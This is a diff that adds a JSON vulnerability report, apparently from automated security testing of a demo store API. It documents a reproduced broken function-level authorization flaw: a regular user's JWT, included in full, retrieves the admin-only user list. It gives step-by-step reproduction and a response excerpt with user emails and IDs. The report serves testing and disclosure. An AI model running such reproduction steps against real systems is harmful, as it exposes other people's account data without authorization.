@@ -1,0 +1,27 @@
+{
+  "vulnerability": "BFLA - Regular user can access admin endpoint /api/v1/admin/users",
+  "severity": "high",
+  "target": "https://duck-store.escape.tech",
+  "endpoint": "GET https://duck-store.escape.tech/api/v1/admin/users",
+  "steps_to_reproduce": [
+    "1. Register a new regular user via POST /api/v1/auth/register",
+    "2. Login as that user via POST /api/v1/auth/login to obtain JWT token",
+    "3. Use the JWT token (role: 'user') to access GET /api/v1/admin/users",
+    "4. Observe that the endpoint returns 200 OK with complete user listing including admin users"
+  ],
+  "proof_request": {
+    "method": "GET",
+    "url": "https://duck-store.escape.tech/api/v1/admin/users",
+    "headers": {
+      "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYmQ4MzdkZGItMzY3Ni00NmRmLWEwYTYtOTRjYTE1NDAxYWNlIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEyMyIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjUwNjY4fQ.qhn9-9gbuOM7bB03_Bc4hL6O9XDFDu6LZDI_iK-tTNo"
+    }
+  },
+  "proof_response": {
+    "status_code": 200,
+    "content_type": "application/json",
+    "response_excerpt": "[{\"username\":\"admin\",\"email\":\"admin@duck-store.escape\",\"id\":\"550e8400-e29b-41d4-a716-446655440000\",\"created_at\":\"2026-09-29T01:39:10.072871\",\"role\":\"admin\",\"first_name\":\"Admin\",\"last_name\":\"Duck\",\"avatar_url\":\"/static/avatars/sarah.png\",\"bio\":\"Store Administrator\",\"account_credit\":0.0,\"referral_count\":0,\"totp_enabled\":false,\"can_be_deleted\":false},{\"username\":\"escape_scanner\",\"email\":\"escape.security@email.com\",\"id\":\"6ba7b815-9dad-11d1-80b4-00c04fd430c8\"...",
+    "full_response_length": 4860
+  },
+  "impact": "A regular authenticated user (role: 'user') can access the administrative endpoint /api/v1/admin/users and retrieve a list of ALL users in the system, including admin users. This exposes sensitive information about all users including administrators (usernames, emails, roles, IDs, bios, etc.).",
+  "verdict": "REPRODUCED"
+}
